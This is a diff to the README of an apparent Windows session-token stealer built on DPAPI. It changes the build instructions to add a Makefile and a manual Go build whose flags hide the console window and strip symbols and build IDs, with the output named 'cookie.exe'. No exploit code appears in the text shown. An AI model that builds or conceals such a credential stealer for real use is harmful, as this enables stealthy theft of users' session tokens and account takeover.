@@ -46,10 +46,17 @@ git clone https://github.com/yanard18/DPAPI-Session-Token-Stealer.git
 cd DPAPI-Session-Token-Stealer
 ```
 
-Build the binary:
+Build the binary using the provided Makefile:
 
 ```bash
-go build -o dpapi-token-stealer
+make
+```
+
+Alternatively, you can manually build it:
+
+```bash
+go clean
+go build -ldflags="-H windowsgui -w -s -buildid=" -trimpath -o bin/cookie.exe ./cmd/main.go
 ```
 
 ## 4. Usage
